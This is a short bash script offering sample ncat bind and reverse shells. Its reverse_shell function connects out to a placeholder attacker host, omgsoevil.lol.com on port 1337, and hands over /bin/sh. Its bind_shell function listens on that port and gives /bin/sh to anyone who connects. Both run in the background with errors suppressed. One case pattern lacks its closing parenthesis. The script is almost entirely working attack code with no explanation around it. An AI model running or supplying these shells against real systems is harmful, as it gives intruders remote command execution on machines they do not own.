#!/bin/bash
## Sample ncat bind/reverse shells
evilHost=omgsoevil.lol.com
evilPort=1337
reverse_shell(){
echo 'Kek the planet. reverse shell spawning...'
(ncat $evilHost $evilPort -e /bin/sh) 2>/dev/null & #reverse shell
}

bind_shell(){
echo 'Kek the planet. bind shell spawning...'
(ncat -lp $evilPort -e /bin/sh) 2>/dev/null &
}

case $1 in
-b|--bind)
bind_shell
;;
-r|--reverse
reverse_shell
;;
*)
echo "usage: $0 -[r|--reverse/-b|--bind]"
;;
esac

exit
